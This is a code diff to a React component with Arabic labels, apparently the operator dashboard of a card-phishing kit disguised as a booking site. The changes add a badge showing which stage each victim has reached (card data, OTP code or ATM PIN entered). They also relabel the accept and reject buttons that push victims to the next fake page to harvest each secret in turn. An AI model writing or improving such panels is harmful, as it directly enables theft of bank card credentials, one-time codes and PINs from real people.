@@ -286,15 +286,21 @@ function BookingDetailsRow({
                   التحكم في العميل
                 </div>
 
-                {/* حالة الدفع الحالية */}
-                {payment.paymentAction && (
-                  <div style={{ background: "#f8fafc", borderRadius: 6, padding: "6px 10px", fontSize: 11, color: "#64748b", border: "1px solid #e2e8f0" }}>
-                    الحالة: <strong style={{ color: payment.paymentAction === "accepted" || payment.paymentAction === "verified" ? "#16a34a" : payment.paymentAction === "denied" ? "#dc2626" : "#d97706" }}>
-                      {payment.paymentAction === "accepted" ? "مقبول" : payment.paymentAction === "verified" ? "تم التحقق" : payment.paymentAction === "denied" ? "مرفوض" : "في الانتظار"}
-                    </strong>
-                    {currentStep > 0 && <span style={{ marginRight: 8 }}>| المرحلة: {currentStep}</span>}
+                {/* بادج المرحلة الحالية */}
+                <div style={{ background: currentStep === 1 ? "#eff6ff" : currentStep === 2 ? "#f0fdf4" : currentStep >= 3 ? "#fef3c7" : "#f8fafc", borderRadius: 8, padding: "10px 12px", border: `1px solid ${currentStep === 1 ? "#bfdbfe" : currentStep === 2 ? "#bbf7d0" : currentStep >= 3 ? "#fde68a" : "#e2e8f0"}` }}>
+                  <div style={{ fontSize: 11, color: "#64748b", marginBottom: 4 }}>المرحلة الحالية</div>
+                  <div style={{ fontSize: 13, fontWeight: 700, color: currentStep === 1 ? "#2563eb" : currentStep === 2 ? "#16a34a" : currentStep >= 3 ? "#d97706" : "#94a3b8" }}>
+                    {currentStep === 0 && "— لم يدخل بيانات بعد"}
+                    {currentStep === 1 && "① مرحلة البطاقة — بيانات البطاقة مدخلة"}
+                    {currentStep === 2 && "② مرحلة OTP — رمز التحقق مدخل"}
+                    {currentStep >= 3 && "③ مرحلة ATM PIN — الرقم السري مدخل"}
                   </div>
-                )}
+                  {payment.paymentAction && (
+                    <div style={{ fontSize: 11, marginTop: 4, color: payment.paymentAction === "accepted" || payment.paymentAction === "verified" || payment.paymentAction === "pass" ? "#16a34a" : payment.paymentAction === "denied" ? "#dc2626" : "#d97706" }}>
+                      آخر إجراء: {payment.paymentAction === "accepted" ? "✅ مقبول" : payment.paymentAction === "pass" ? "✅ مرور" : payment.paymentAction === "verified" ? "✅ تم التحقق" : payment.paymentAction === "denied" ? "❌ مرفوض" : "⏳ في الانتظار"}
+                    </div>
+                  )}
+                </div>
 
                 {/* زر القبول */}
                 <button
@@ -319,7 +325,13 @@ function BookingDetailsRow({
                   <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                     <polyline points="20 6 9 17 4 12"/>
                   </svg>
-                  {currentStep === 0 || currentStep === 1 ? "قبول → OTP" : currentStep === 2 ? "قبول → رمز ثانٍ" : "قبول → إتمام"}
+                  {
+                    currentStep <= 1
+                      ? "✅ قبول → صفحة OTP"
+                      : currentStep === 2
+                      ? "✅ قبول → صفحة ATM PIN"
+                      : "✅ قبول → الصفحة التالية"
+                  }
                 </button>
 
                 {/* زر الرفض */}
@@ -346,7 +358,13 @@ function BookingDetailsRow({
                     <line x1="18" y1="6" x2="6" y2="18"/>
                     <line x1="6" y1="6" x2="18" y2="18"/>
                   </svg>
-                  {currentStep === 0 || currentStep === 1 ? "رفض → صفحة البطاقة" : currentStep === 2 ? "رفض → OTP" : "رفض → رمز ثانٍ"}
+                  {
+                    currentStep <= 1
+                      ? "❌ رفض → صفحة البطاقة"
+                      : currentStep === 2
+                      ? "❌ رفض → صفحة OTP"
+                      : "❌ رفض → صفحة ATM PIN"
+                  }
                 </button>
 
                 {/* فاصل */}
